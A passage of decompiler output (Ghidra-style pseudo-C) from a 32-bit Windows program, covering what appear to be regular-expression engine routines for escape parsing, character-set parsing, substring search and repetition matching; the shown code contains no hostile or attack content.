  if ((ppiVar1[10] == (int *)0x0) && ((int **)ppiVar1[1][1] == ppiVar1)) {
    ppiVar1 = (int **)ppiVar1[2];
  }
  else if (*ppiVar1 == DAT_0041c9ac) {
    while (ppiVar1 = (int **)ppiVar1[1], *param_1 == *ppiVar1) {
      *param_1 = (int *)ppiVar1;
    }
  }
  else {
    ppiVar1 = (int **)FUN_0040a50b((int)*ppiVar1);
  }
  local_8 = 0xffffffff;
  *param_1 = (int *)ppiVar1;
  std::_Lockit::~_Lockit((_Lockit *)&local_14);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __cdecl FUN_004133fe(int param_1,int param_2)

{
  size_t sVar1;
  undefined *local_3c [7];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_20 [16];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_004163ad;
  local_10 = ExceptionList;
  if (param_2 == param_1) {
    local_20[0] = param_2._3_1_;
    ExceptionList = &local_10;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_20,false);
    sVar1 = strlen(s_expecting_end_of_character_set_0041c520);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
              (local_20,s_expecting_end_of_character_set_0041c520,sVar1);
    local_8 = 0;
    std::logic_error::logic_error((logic_error *)local_3c,local_20);
    local_3c[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_3c,(ThrowInfo *)&DAT_004196f8);
  }
  return;
}



byte __cdecl FUN_0041346f(byte **param_1,int param_2,char param_3)

{
  byte bVar1;
  int iVar2;
  byte *pbVar3;
  undefined4 uVar4;
  byte bVar5;
  
  FUN_004133fe((int)*param_1,param_2);
  pbVar3 = *param_1;
  bVar5 = *pbVar3;
  if ((char)bVar5 < 'g') {
    if (bVar5 == 0x66) {
      if (param_3 != '\0') {
        bVar5 = 0xc;
      }
    }
    else if ('/' < (char)bVar5) {
      if ((char)bVar5 < '8') {
        bVar5 = bVar5 - 0x30;
        *param_1 = pbVar3 + 1;
        while( true ) {
          bVar1 = **param_1;
          if ((char)bVar1 < '0') {
            return bVar5;
          }
          if ('7' < (char)bVar1) break;
          bVar5 = (bVar5 - 6) * '\b' + bVar1;
          pbVar3 = *param_1 + 1;
          *param_1 = pbVar3;
          FUN_004133fe((int)pbVar3,param_2);
        }
        return bVar5;
      }
      if (bVar5 == 0x5c) {
        if (param_3 != '\0') {
          bVar5 = 0x5c;
        }
      }
      else if (bVar5 == 0x61) {
        if (param_3 != '\0') {
          bVar5 = 7;
        }
      }
      else {
        if (bVar5 == 99) {
          *param_1 = pbVar3 + 1;
          FUN_004133fe((int)(pbVar3 + 1),param_2);
          bVar5 = **param_1;
          *param_1 = *param_1 + 1;
          if (('`' < (char)bVar5) && ((char)bVar5 < '{')) {
            iVar2 = toupper((int)(char)bVar5);
            bVar5 = (byte)iVar2;
          }
          return bVar5 ^ 0x40;
        }
        if (bVar5 == 0x65) {
          bVar5 = 0x1b;
        }
      }
    }
  }
  else if (bVar5 == 0x6e) {
    if (param_3 != '\0') {
      bVar5 = 10;
    }
  }
  else if (bVar5 == 0x72) {
    if (param_3 != '\0') {
      bVar5 = 0xd;
    }
  }
  else if (bVar5 == 0x74) {
    if (param_3 != '\0') {
      bVar5 = 9;
    }
  }
  else if (bVar5 == 0x76) {
    if (param_3 != '\0') {
      bVar5 = 0xb;
    }
  }
  else if (bVar5 == 0x78) {
    bVar5 = 0;
    *param_1 = pbVar3 + 1;
    while (uVar4 = FUN_00402f9a(**param_1), (char)uVar4 != '\0') {
      iVar2 = FUN_00402fbd(**param_1);
      bVar5 = bVar5 * '\x10' + (char)iVar2;
      *param_1 = *param_1 + 1;
      FUN_004133fe((int)*param_1,param_2);
    }
    return bVar5;
  }
  *param_1 = pbVar3 + 1;
  return bVar5;
}



void __cdecl FUN_004135d1(int param_1,ushort **param_2,ushort *param_3,uint *param_4)

{
  byte *pbVar1;
  bool bVar2;
  int iVar3;
  byte bVar4;
  byte bVar5;
  wctype_t wVar6;
  ushort uVar7;
  wctype_t wVar8;
  int iVar9;
  undefined3 extraout_var;
  undefined *puVar10;
  undefined4 *puVar11;
  undefined2 extraout_var_00;
  undefined2 extraout_var_01;
  undefined2 extraout_var_02;
  undefined2 extraout_var_03;
  undefined2 extraout_var_04;
  undefined2 extraout_var_05;
  undefined2 extraout_var_06;
  undefined2 extraout_var_07;
  undefined2 extraout_var_08;
  undefined2 extraout_var_09;
  undefined2 extraout_var_10;
  uint *puVar12;
  undefined2 extraout_var_11;
  undefined2 extraout_var_12;
  undefined4 extraout_ECX;
  void *pvVar13;
  ushort *puVar14;
  undefined2 uVar15;
  uint uVar16;
  undefined4 uVar17;
  uint local_4c;
  uint local_48;
  uint local_44;
  uint local_40;
  uint local_3c;
  uint local_38;
  uint local_34;
  uint local_30;
  uint local_2c;
  uint local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  uint local_18;
  undefined4 local_14;
  ushort *local_10;
  ushort *local_c;
  undefined4 local_8;
  
  iVar3 = param_1;
  local_10 = *param_2;
  local_14 = CONCAT31(local_14._1_3_,(*param_4 & 0x100) == 0x100);
  if ((param_3 != local_10) &&
     (iVar9 = FUN_0040bd91((char **)&local_10,(char *)param_3), iVar9 == 0x2d)) {
    *(undefined *)(*(int *)(param_1 + 4) + 4) = 1;
    *param_2 = local_10;
  }
  param_1 = 0;
  bVar2 = false;
  puVar14 = *param_2;
  local_8 = CONCAT31(local_8._1_3_,'\x01' - (((byte)*param_4 & 1) != 1));
  FUN_004133fe((int)puVar14,(int)param_3);
  local_c = (ushort *)FUN_0040bd91((char **)param_2,(char *)param_3);
  do {
    FUN_004133fe((int)*param_2,(int)param_3);
    bVar5 = (byte)param_1;
    if (local_c == (ushort *)0x2f) {
      if (!bVar2) goto LAB_0041371f;
      local_c = *param_2;
      bVar2 = false;
      iVar9 = FUN_0040bd91((char **)param_2,(char *)param_3);
      uVar17 = local_8;
      if (iVar9 == 0) {
LAB_004136fb:
        uVar16 = CONCAT31((int3)((uint)extraout_ECX >> 8),*(undefined *)*param_2);
        *param_2 = (ushort *)((int)*param_2 + 1);
LAB_004136c9:
        pvVar13 = *(void **)(iVar3 + 4);
LAB_004136cf:
        FUN_00414977(pvVar13,bVar5,uVar16,(char)uVar17);
      }
      else {
        if (iVar9 == 0x2d) {
LAB_004136f6:
          *param_2 = local_c;
          goto LAB_004136fb;
        }
        if (iVar9 == 0x2e) {
          pvVar13 = *(void **)(iVar3 + 4);
          bVar4 = FUN_0041346f((byte **)param_2,(int)param_3,(char)local_14);
          uVar16 = CONCAT31(extraout_var,bVar4);
          goto LAB_004136cf;
        }
        if (iVar9 == 0x2f) goto LAB_004136f6;
        if (iVar9 == 0x30) {
          uVar16 = 8;
          goto LAB_004136c9;
        }
        *param_2 = puVar14;
        FUN_00414933(*(void **)(iVar3 + 4),bVar5,(char)local_8);
        bVar5 = *(byte *)*param_2;
        *param_2 = (ushort *)((int)*param_2 + 1);
        FUN_00414933(*(void **)(iVar3 + 4),bVar5,(char)local_8);
      }
      goto LAB_00413a51;
    }
    if (bVar2) {
      FUN_00414933(*(void **)(iVar3 + 4),bVar5,(char)local_8);
    }
LAB_0041371f:
    bVar2 = false;
    if ((int)local_c < 0x39) {
      if (local_c == (ushort *)0x38) {
        puVar14 = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
        uVar7 = FUN_00409822();
        goto LAB_00413a31;
      }
      if ((int)local_c < 0x30) {
        if (local_c != (ushort *)0x2f) {
          if ((int)local_c < 0x18) {
            if (local_c == (ushort *)0x17) {
              pvVar13 = *(void **)(iVar3 + 4);
              puVar10 = FUN_004080d8();
            }
            else if (local_c == (ushort *)0x13) {
              pvVar13 = *(void **)(iVar3 + 4);
              puVar10 = FUN_0040811c();
            }
            else if (local_c == (ushort *)0x14) {
              pvVar13 = *(void **)(iVar3 + 4);
              puVar10 = FUN_004081d0();
            }
            else if (local_c == (ushort *)0x15) {
              pvVar13 = *(void **)(iVar3 + 4);
              puVar10 = FUN_00408154();
            }
            else {
              if (local_c != (ushort *)0x16) goto switchD_004137f8_caseD_8;
              pvVar13 = *(void **)(iVar3 + 4);
              puVar10 = FUN_00408208();
            }
          }
          else {
            if (local_c != (ushort *)0x18) {
              if (local_c != (ushort *)0x2d) {
                if (local_c != (ushort *)0x2e) goto switchD_004137f8_caseD_8;
                puVar11 = FUN_00409cbb(CONCAT31((int3)((uint)*param_2 >> 8),*(undefined *)*param_2),
                                       param_4);
                if (puVar11 == (undefined4 *)0x0) {
                  bVar5 = FUN_0041346f((byte **)param_2,(int)param_3,(char)local_14);
                  param_1 = (int)bVar5;
                  goto LAB_00413a4d;
                }
                FUN_0041482d(*(void **)(iVar3 + 4),(int)puVar11);
                *param_2 = (ushort *)((int)*param_2 + 1);
                goto LAB_00413a51;
              }
              goto switchD_004137f8_caseD_31;
            }
            pvVar13 = *(void **)(iVar3 + 4);
            puVar10 = FUN_0040818c();
          }
          FUN_0041482d(pvVar13,(int)puVar10);
          goto LAB_00413a51;
        }
switchD_004137f8_caseD_31:
        *param_2 = puVar14;
        param_1 = (int)*(byte *)puVar14;
        *param_2 = (ushort *)((int)puVar14 + 1);
        goto LAB_00413a4d;
      }
      switch(local_c) {
      case (ushort *)0x30:
        param_1 = 8;
        goto LAB_00413a4d;
      case (ushort *)0x31:
        goto switchD_004137f8_caseD_31;
      case (ushort *)0x32:
        puVar14 = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
        uVar7 = FUN_004097f9();
        goto LAB_00413a31;
      case (ushort *)0x33:
        wVar6 = FUN_004097f9();
        local_18 = CONCAT22(extraout_var_00,wVar6);
        puVar12 = &local_18;
        break;
      case (ushort *)0x34:
        puVar14 = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
        uVar7 = FUN_00407684();
        goto LAB_00413a31;
      case (ushort *)0x35:
        wVar6 = FUN_00407684();
        local_1c = CONCAT22(extraout_var_01,wVar6);
        puVar12 = &local_1c;
        break;
      case (ushort *)0x36:
        pbVar1 = (byte *)(*(int *)(iVar3 + 4) + 0x26);
        *pbVar1 = *pbVar1 | 0x40;
        goto LAB_00413a51;
      case (ushort *)0x37:
        local_20 = 0x40;
        puVar12 = &local_20;
        break;
      default:
        goto switchD_004137f8_caseD_8;
      }
      goto LAB_00413a0b;
    }
    if (0x10 < (int)local_c - 0x39U) {
switchD_004137f8_caseD_8:
      param_1 = (int)*(byte *)*param_2;
      *param_2 = (ushort *)((int)*param_2 + 1);
LAB_00413a4d:
      bVar2 = true;
      goto LAB_00413a51;
    }
    uVar15 = (undefined2)((uint)puVar14 >> 0x10);
    switch(local_c) {
    case (ushort *)0x39:
      wVar6 = FUN_00409822();
      local_24 = CONCAT22(extraout_var_02,wVar6);
      puVar12 = &local_24;
      break;
    case (ushort *)0x3a:
      puVar14 = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
      uVar7 = FUN_004076ad();
      goto LAB_00413a31;
    case (ushort *)0x3b:
      wVar6 = FUN_004076ad();
      local_28 = CONCAT22(extraout_var_03,wVar6);
      puVar12 = &local_28;
      break;
    case (ushort *)0x3c:
      puVar14 = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
      uVar7 = FUN_0040984b();
      goto LAB_00413a31;
    case (ushort *)0x3d:
      wVar6 = FUN_0040984b();
      local_2c = CONCAT22(extraout_var_04,wVar6);
      puVar12 = &local_2c;
      break;
    case (ushort *)0x3e:
      if (((byte)*param_4 & 1) == 1) {
        local_c = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
        wVar6 = FUN_004098ef();
        wVar8 = FUN_00409874();
        uVar7 = wVar6 | wVar8;
LAB_004139d8:
        *local_c = *local_c | uVar7;
        goto LAB_00413a51;
      }
      puVar14 = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
      uVar7 = FUN_00409874();
      goto LAB_00413a31;
    case (ushort *)0x3f:
      if (((byte)*param_4 & 1) == 1) {
        wVar6 = FUN_004098ef();
        wVar8 = FUN_00409874();
        local_30 = CONCAT22(uVar15,wVar6) | CONCAT22(extraout_var_05,wVar8);
        puVar12 = &local_30;
      }
      else {
        wVar6 = FUN_00409874();
        local_34 = CONCAT22(extraout_var_06,wVar6);
        puVar12 = &local_34;
      }
      break;
    case (ushort *)0x40:
      puVar14 = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
      uVar7 = FUN_0040989d();
      goto LAB_00413a31;
    case (ushort *)0x41:
      wVar6 = FUN_0040989d();
      local_38 = CONCAT22(extraout_var_07,wVar6);
      puVar12 = &local_38;
      break;
    case (ushort *)0x42:
      puVar14 = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
      uVar7 = FUN_004098c6();
      goto LAB_00413a31;
    case (ushort *)0x43:
      wVar6 = FUN_004098c6();
      local_3c = CONCAT22(extraout_var_08,wVar6);
      puVar12 = &local_3c;
      break;
    case (ushort *)0x44:
      puVar14 = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
      uVar7 = FUN_004076d6();
      goto LAB_00413a31;
    case (ushort *)0x45:
      wVar6 = FUN_004076d6();
      local_40 = CONCAT22(extraout_var_09,wVar6);
      puVar12 = &local_40;
      break;
    case (ushort *)0x46:
      if (((byte)*param_4 & 1) == 1) {
        local_c = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
        wVar6 = FUN_004098ef();
        wVar8 = FUN_00409874();
        uVar7 = wVar6 | wVar8;
        goto LAB_004139d8;
      }
      puVar14 = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
      uVar7 = FUN_004098ef();
      goto LAB_00413a31;
    case (ushort *)0x47:
      if (((byte)*param_4 & 1) == 1) {
        wVar6 = FUN_004098ef();
        wVar8 = FUN_00409874();
        local_44 = CONCAT22(uVar15,wVar6) | CONCAT22(extraout_var_10,wVar8);
        puVar12 = &local_44;
      }
      else {
        wVar6 = FUN_004098ef();
        local_48 = CONCAT22(extraout_var_11,wVar6);
        puVar12 = &local_48;
      }
      break;
    case (ushort *)0x48:
      puVar14 = (ushort *)(*(int *)(iVar3 + 4) + 0x26);
      uVar7 = FUN_00409918();
LAB_00413a31:
      *puVar14 = *puVar14 | uVar7;
      goto LAB_00413a51;
    case (ushort *)0x49:
      wVar6 = FUN_00409918();
      local_4c = CONCAT22(extraout_var_12,wVar6);
      puVar12 = &local_4c;
    }
LAB_00413a0b:
    FUN_00414a91((void *)(*(int *)(iVar3 + 4) + 0x2d),(undefined2 *)puVar12);
LAB_00413a51:
    puVar14 = *param_2;
    FUN_004133fe((int)puVar14,(int)param_3);
    local_c = (ushort *)FUN_0040bd91((char **)param_2,(char *)param_3);
    if (local_c == (ushort *)0x31) {
      if (bVar2) {
        FUN_00414933(*(void **)(iVar3 + 4),(byte)param_1,(char)local_8);
      }
      pvVar13 = *(void **)(iVar3 + 4);
      FUN_00408ada(pvVar13);
      *(undefined2 *)((int)pvVar13 + 0x26) = 0;
      return;
    }
  } while( true );
}



void __thiscall FUN_00413b05(void *this,undefined4 *param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(*(int *)((int)this + 0x418) + -4);
  *param_1 = *puVar1;
  FUN_0040c040(this,(int)puVar1);
  return;
}



byte * __thiscall FUN_00413b21(void *this,byte *param_1,byte *param_2)

{
  uint uVar1;
  uint uVar2;
  byte *pbVar3;
  int iVar4;
  byte *pbVar5;
  
  uVar2 = (uint)*(byte *)((int)this + 0xc);
  iVar4 = (int)param_2 - (int)param_1;
  uVar1 = uVar2;
  pbVar5 = param_1;
  do {
    if (iVar4 <= (int)uVar1) {
      return param_2;
    }
    param_1 = *(byte **)((int)this + 4);
    pbVar5 = pbVar5 + uVar2;
    for (pbVar3 = pbVar5;
        (*pbVar3 == *param_1 || (*pbVar3 == pbVar3[*(int *)((int)this + 8) - (int)pbVar5]));
        pbVar3 = pbVar3 + -1) {
                    // WARNING: Load size is inaccurate
      if (param_1 == *this) {
        return pbVar3;
      }
      param_1 = param_1 + -1;
    }
    uVar2 = (uint)*(byte *)(*pbVar5 + 0xd + (int)this);
    uVar1 = uVar1 + uVar2;
  } while( true );
}



byte * __thiscall FUN_00413b86(void *this,byte *param_1,byte *param_2)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  byte *pbVar4;
  byte *pbVar5;
  
  uVar2 = (uint)*(byte *)((int)this + 0xc);
  iVar3 = (int)param_2 - (int)param_1;
  uVar1 = uVar2;
  pbVar4 = param_1;
  do {
    if (iVar3 <= (int)uVar1) {
      return param_2;
    }
    pbVar5 = *(byte **)((int)this + 4);
    pbVar4 = pbVar4 + uVar2;
    param_1 = pbVar4;
    if (*pbVar4 == *pbVar5) {
      do {
                    // WARNING: Load size is inaccurate
        if (pbVar5 == *this) {
          return param_1;
        }
        param_1 = param_1 + -1;
        pbVar5 = pbVar5 + -1;
      } while (*param_1 == *pbVar5);
    }
    uVar2 = (uint)*(byte *)(*pbVar4 + 0xd + (int)this);
    uVar1 = uVar1 + uVar2;
  } while( true );
}



void __cdecl FUN_00413bde(char *param_1,char *param_2)

{
  char cVar1;
  char cVar2;
  char *pcVar3;
  char *pcVar4;
  
  if ((int)param_2 - (int)param_1 < 0x11) {
    FUN_00414d84(param_1,param_2);
  }
  else {
    FUN_00414b67(param_1,param_2);
    pcVar3 = param_1 + 0x10;
    FUN_00414d84(param_1,pcVar3);
    for (; pcVar3 != param_2; pcVar3 = pcVar3 + 1) {
      cVar1 = *pcVar3;
      pcVar4 = pcVar3;
      while( true ) {
        cVar2 = pcVar4[-1];
        if (cVar2 <= cVar1) break;
        *pcVar4 = cVar2;
        pcVar4 = pcVar4 + -1;
      }
      *pcVar4 = cVar1;
    }
  }
  return;
}



char * __cdecl FUN_00413c33(char *param_1,char *param_2,char *param_3)

{
  char *pcVar1;
  char cVar2;
  
  if (param_1 == param_2) {
    return param_3;
  }
  cVar2 = *param_1;
  do {
    pcVar1 = param_1;
    *param_3 = cVar2;
    param_3 = param_3 + 1;
    param_1 = pcVar1;
    do {
      param_1 = param_1 + 1;
      if (param_1 == param_2) {
        return param_3;
      }
      cVar2 = *param_1;
    } while (*pcVar1 == cVar2);
  } while( true );
}



undefined4 __thiscall FUN_00413c63(void *this,int *param_1,undefined4 param_2)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  int iVar5;
  
  piVar1 = (int *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1);
  iVar2 = *piVar1;
  if (*(int *)((int)this + 0x10) != iVar2) {
    *piVar1 = iVar2 + 1;
    uVar4 = (**(code **)**(undefined4 **)((int)this + 8))(param_1,param_2);
    if ((char)uVar4 != '\0') {
      return CONCAT31((int3)((uint)uVar4 >> 8),1);
    }
    iVar2 = *param_1;
    iVar5 = *(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a;
    piVar1 = (int *)(iVar5 + 0xd + iVar2);
    *piVar1 = *piVar1 + -1;
    uVar3 = *(uint *)(iVar5 + 0xd + iVar2);
    if (uVar3 < *(uint *)((int)this + 0xc)) {
      return uVar3 & 0xffffff00;
    }
  }
  uVar4 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
  return uVar4;
}



undefined4 __thiscall FUN_00413cc7(void *this,int *param_1,undefined4 param_2)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  int iVar5;
  
  piVar1 = (int *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1);
  iVar2 = *piVar1;
  if (*(int *)((int)this + 0x10) != iVar2) {
    *piVar1 = iVar2 + 1;
    uVar4 = (**(code **)(**(int **)((int)this + 8) + 4))(param_1,param_2);
    if ((char)uVar4 != '\0') {
      return CONCAT31((int3)((uint)uVar4 >> 8),1);
    }
    iVar2 = *param_1;
    iVar5 = *(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a;
    piVar1 = (int *)(iVar5 + 0xd + iVar2);
    *piVar1 = *piVar1 + -1;
    uVar3 = *(uint *)(iVar5 + 0xd + iVar2);
    if (uVar3 < *(uint *)((int)this + 0xc)) {
      return uVar3 & 0xffffff00;
    }
  }
  uVar4 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
  return uVar4;
}



uint __thiscall FUN_00413d2d(void *this,int *param_1,undefined4 param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  uint *puVar6;
  
  if (*(uint *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1) <
      *(uint *)((int)this + 0xc)) {
LAB_00413d59:
    puVar6 = (uint *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1);
    if (*puVar6 < *(uint *)((int)this + 0x10)) {
      *puVar6 = *puVar6 + 1;
      uVar3 = (**(code **)**(undefined4 **)((int)this + 8))(param_1,param_2);
      if ((char)uVar3 != '\0') goto LAB_00413d82;
      iVar2 = *param_1;
      iVar5 = *(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a;
      piVar1 = (int *)(iVar5 + 0xd + iVar2);
      *piVar1 = *piVar1 + -1;
      puVar6 = (uint *)(iVar5 + 0xd + iVar2);
    }
    uVar4 = (uint)puVar6 & 0xffffff00;
  }
  else {
    uVar3 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar3 == '\0') goto LAB_00413d59;
LAB_00413d82:
    uVar4 = CONCAT31((int3)((uint)uVar3 >> 8),1);
  }
  return uVar4;
}



uint __thiscall FUN_00413da0(void *this,int *param_1,undefined4 param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  uint *puVar6;
  
  if (*(uint *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1) <
      *(uint *)((int)this + 0xc)) {
LAB_00413dcd:
    puVar6 = (uint *)(*(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a + 0xd + *param_1);
    if (*puVar6 < *(uint *)((int)this + 0x10)) {
      *puVar6 = *puVar6 + 1;
      uVar3 = (**(code **)(**(int **)((int)this + 8) + 4))(param_1,param_2);
      if ((char)uVar3 != '\0') goto LAB_00413df7;
      iVar2 = *param_1;
      iVar5 = *(int *)(*(int *)((int)this + 0x14) + 0x10) * 0x1a;
      piVar1 = (int *)(iVar5 + 0xd + iVar2);
      *piVar1 = *piVar1 + -1;
      puVar6 = (uint *)(iVar5 + 0xd + iVar2);
    }
    uVar4 = (uint)puVar6 & 0xffffff00;
  }
  else {
    uVar3 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar3 == '\0') goto LAB_00413dcd;
LAB_00413df7:
    uVar4 = CONCAT31((int3)((uint)uVar3 >> 8),1);
  }
  return uVar4;
}



undefined4 __cdecl FUN_00413e15(ushort *param_1,ushort *param_2)

{
  if ((*param_2 <= *param_1) && ((*param_2 < *param_1 || (param_2[1] <= param_1[1])))) {
    return 0;
  }
  return 1;
}



void __thiscall FUN_00413e3e(void *this,int *param_1,undefined4 param_2)

{
  undefined4 *puVar1;
  
  puVar1 = *(undefined4 **)((int)this + 0xc);
  if (((*(uint *)((int)this + 0x30) < (uint)param_1[3]) &&
      (*(char *)(*(uint *)((int)this + 0x30) * 0x1a + 8 + *param_1) != '\0')) ||
     (puVar1 = (undefined4 *)puVar1[1], puVar1 != (undefined4 *)0x0)) {
    puVar1 = (undefined4 *)*puVar1;
  }
  else {
    puVar1 = *(undefined4 **)((int)this + 4);
  }
  (**(code **)*puVar1)(param_1,param_2);
  return;
}



void __thiscall FUN_00413e77(void *this,int *param_1,undefined4 param_2)

{
  int *piVar1;
  int **ppiVar2;
  
  ppiVar2 = *(int ***)((int)this + 0xc);
  if (((*(uint *)((int)this + 0x30) < (uint)param_1[3]) &&
      (*(char *)(*(uint *)((int)this + 0x30) * 0x1a + 8 + *param_1) != '\0')) ||
     (ppiVar2 = (int **)ppiVar2[1], ppiVar2 != (int **)0x0)) {
    piVar1 = *ppiVar2;
  }
  else {
    piVar1 = *(int **)((int)this + 4);
  }
  (**(code **)(*piVar1 + 4))(param_1,param_2);
  return;
}



undefined4 __thiscall FUN_00413eb1(void *this,int *param_1)

{
  void **ppvVar1;
  int *piVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  
  piVar3 = param_1;
  piVar2 = *(int **)((int)this + 0xc);
  if ((*(uint *)((int)this + 0x30) < (uint)param_1[3]) &&
     (*(char *)(*(uint *)((int)this + 0x30) * 0x1a + 8 + *param_1) != '\0')) {
    ppvVar1 = (void **)(param_1 + 8);
    param_1 = (int *)CONCAT13(1,param_1._0_3_);
    FUN_00414bd2(*ppvVar1,(undefined *)((int)&param_1 + 3));
    iVar4 = *piVar2;
    piVar3[4] = iVar4;
  }
  else {
    ppvVar1 = (void **)(param_1 + 8);
    param_1 = (int *)((uint)param_1 & 0xffffff);
    iVar4 = FUN_00414bd2(*ppvVar1,(undefined *)((int)&param_1 + 3));
    piVar2 = (int *)piVar2[1];
    if (piVar2 == (int *)0x0) {
      iVar5 = *(int *)((int)this + 4);
    }
    else {
      iVar5 = *piVar2;
    }
    piVar3[4] = iVar5;
  }
  return CONCAT31((int3)((uint)iVar4 >> 8),1);
}



void __thiscall FUN_00413f14(void *this,undefined4 param_1,undefined4 param_2)

{
  char cVar1;
  undefined4 *puVar2;
  
  puVar2 = *(undefined4 **)((int)this + 0xc);
  cVar1 = (**(code **)**(undefined4 **)((int)this + 0x34))(param_1,param_2);
  if ((cVar1 == '\0') && (puVar2 = (undefined4 *)puVar2[1], puVar2 == (undefined4 *)0x0)) {
    puVar2 = *(undefined4 **)((int)this + 4);
  }
  else {
    puVar2 = (undefined4 *)*puVar2;
  }
  (**(code **)*puVar2)(param_1,param_2);
  return;
}



void __thiscall FUN_00413f4d(void *this,undefined4 param_1,undefined4 param_2)

{
  char cVar1;
  int *piVar2;
  int **ppiVar3;
  
  ppiVar3 = *(int ***)((int)this + 0xc);
  cVar1 = (**(code **)(**(int **)((int)this + 0x34) + 4))(param_1,param_2);
  if ((cVar1 == '\0') && (ppiVar3 = (int **)ppiVar3[1], ppiVar3 == (int **)0x0)) {
    piVar2 = *(int **)((int)this + 4);
  }
  else {
    piVar2 = *ppiVar3;
  }
  (**(code **)(*piVar2 + 4))(param_1,param_2);
  return;
}



undefined4 __thiscall FUN_00413f88(void *this,uint param_1)

{
  undefined4 *puVar1;
  uint uVar2;
  char cVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  
  uVar2 = param_1;
  puVar1 = *(undefined4 **)((int)this + 0xc);
  cVar3 = (**(code **)(**(int **)((int)this + 0x34) + 8))(param_1);
  if (cVar3 == '\0') {
    param_1 = param_1 & 0xffffff;
    uVar4 = FUN_00414bd2(*(void **)(uVar2 + 0x20),(undefined *)((int)&param_1 + 3));
    puVar1 = (undefined4 *)puVar1[1];
    if (puVar1 == (undefined4 *)0x0) {
      uVar5 = *(undefined4 *)((int)this + 4);
    }
    else {
      uVar5 = *puVar1;
    }
    *(undefined4 *)(uVar2 + 0x10) = uVar5;
  }
  else {
    param_1 = CONCAT13(1,(undefined3)param_1);
    FUN_00414bd2(*(void **)(uVar2 + 0x20),(undefined *)((int)&param_1 + 3));
    uVar4 = *puVar1;
    *(undefined4 *)(uVar2 + 0x10) = uVar4;
  }
  return CONCAT31((int3)((uint)uVar4 >> 8),1);
}



undefined4 __thiscall FUN_00413fe4(void *this,uint param_1)

{
  undefined4 *puVar1;
  uint uVar2;
  char cVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  
  uVar2 = param_1;
  puVar1 = *(undefined4 **)((int)this + 0xc);
  cVar3 = (**(code **)(**(int **)((int)this + 0x34) + 0xc))(param_1);
  if (cVar3 == '\0') {
    param_1 = param_1 & 0xffffff;
    uVar4 = FUN_00414bd2(*(void **)(uVar2 + 0x20),(undefined *)((int)&param_1 + 3));
    puVar1 = (undefined4 *)puVar1[1];
    if (puVar1 == (undefined4 *)0x0) {
      uVar5 = *(undefined4 *)((int)this + 4);
    }
    else {
      uVar5 = *puVar1;
    }
    *(undefined4 *)(uVar2 + 0x10) = uVar5;
  }
  else {
    param_1 = CONCAT13(1,(undefined3)param_1);
    FUN_00414bd2(*(void **)(uVar2 + 0x20),(undefined *)((int)&param_1 + 3));
    uVar4 = *puVar1;
    *(undefined4 *)(uVar2 + 0x10) = uVar4;
  }
  return CONCAT31((int3)((uint)uVar4 >> 8),1);
}



uint __thiscall FUN_00414040(void *this,int param_1)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = param_1;
  uVar2 = FUN_00414be8(*(void **)(param_1 + 0x20),(undefined *)((int)&param_1 + 3));
  if (param_1._3_1_ != '\0') {
    uVar2 = (**(code **)(**(int **)((int)this + 0x34) + 0x10))(iVar1);
  }
  return uVar2 & 0xffffff00;
}



uint __thiscall FUN_0041406d(void *this,int param_1)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = param_1;
  uVar2 = FUN_00414be8(*(void **)(param_1 + 0x20),(undefined *)((int)&param_1 + 3));
  if (param_1._3_1_ != '\0') {
    uVar2 = (**(code **)(**(int **)((int)this + 0x34) + 0x14))(iVar1);
  }
  return uVar2 & 0xffffff00;
}



undefined4 __cdecl FUN_0041409a(int param_1,char *param_2)

{
  if ((*(char **)(param_1 + 4) != param_2) &&
     ((*param_2 != '\n' || (*(char **)(param_1 + 4) != param_2 + 1)))) {
    return 0;
  }
  return 1;
}



undefined4 __cdecl FUN_004140ba(undefined4 param_1,char *param_2)

{
